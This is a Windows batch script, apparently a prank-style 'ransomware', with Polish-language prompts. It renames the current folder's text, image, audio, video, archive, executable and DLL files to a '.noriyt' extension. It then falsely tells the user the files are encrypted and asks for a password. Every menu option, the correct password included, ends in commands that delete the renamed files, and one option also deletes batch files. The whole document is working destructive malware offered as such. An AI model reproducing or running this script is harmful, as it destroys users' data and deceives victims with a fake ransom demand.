@echo off
title RANSOMWARE
color 2

:RANSOMWARE
Ren *.txt *.noriyt
Ren *.iso *.noriyt
Ren *.png *.noriyt
Ren *.jpg *.noriyt
Ren *.jpeg *.noriyt
Ren *.mp3 *.noriyt
Ren *.mp4 *.noriyt
Ren *.vav *.noriyt
Ren *.zip *.noriyt
Ren *.rar *.noriyt
Ren *.exe *.noriyt
Ren *.dll *.noriyt

:poczatek
cls
echo twoje pliki zostaly zaszyfrowane nic nie poradze
echo.
echo 1) wpisz haslo
echo 2) usun pliki
echo 3) wylacz program
echo 4) skad wziac haslo?
echo.
set /p opcja=wybierz:
if %opcja%==1 goto opcja1
if %opcja%==2 goto opcja2
if %opcja%==3 goto opcja3
if %opcja%==4 goto opcja4

:opcja1
cls
echo wpisz tu haslo
set/p klucz=klucz
if %klucz%==NoriYT goto dobrze
if not %klucz%==NoriYT goto zle
:dobrze
echo brawo
pause
echo hehe wylacz program a dostaniesz pliki
pause
del *.noriyt
pause
exit
:zle
echo zle haslo probuj dalej
pause
goto poczatek
:opcja2
cls
echo usuwanie plikow
del *.noriyt
echo usuniete
pause
exit
:opcja3
cls
echo wybrano wyjscie
echo juz nie ma plikow
del *.bat
:opcja4
cls
echo nie da sie :(
echo.
echo.
pause
goto poczatek
